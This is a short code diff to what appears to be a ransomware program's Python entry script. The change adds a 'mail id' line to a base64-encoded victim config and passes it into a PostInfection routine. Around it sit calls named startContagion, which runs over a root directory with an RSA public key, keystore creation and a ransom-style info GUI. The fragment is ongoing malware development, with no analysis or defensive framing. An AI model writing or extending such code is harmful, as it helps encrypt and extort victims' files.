@@ -12,10 +12,16 @@ if starter.checkFirstTime("online"):
 
     working_directory = sys.argv[1]
     config_path = os.path.join(working_directory,"1_config.txt")
+    """
+        Lines
+            1 - victim id
+            2 - mail id 
+    """
 
     with open(config_path,"r") as configFile:
-        # version = b64decode(configFile.readline()).strip().decode("utf-8")
         what_is_my_id = b64decode(configFile.readline()).strip().decode("utf-8")
+        what_is_my_mail_id = b64decode(configFile.readline()).strip().decode("utf-8")
+
 
     rsa_public_key_name = what_is_my_id + "_rsa_public_key.pub"
     rsa_public_key_path = os.path.join(working_directory, rsa_public_key_name)
@@ -23,7 +29,7 @@ if starter.checkFirstTime("online"):
 
     starter.keyStoreCreate(what_is_my_id)
     starter.startContagion(root_directory, rsa_public_key)
-    PostInfection(what_is_my_id , "online", when_did_i_work, rsa_public_key).firstWork()
+    PostInfection(what_is_my_id , what_is_my_mail_id, "online", when_did_i_work, rsa_public_key).firstWork()
     guiMode.displayInfoGUI(aesIV_file_store_path)
 
 else:
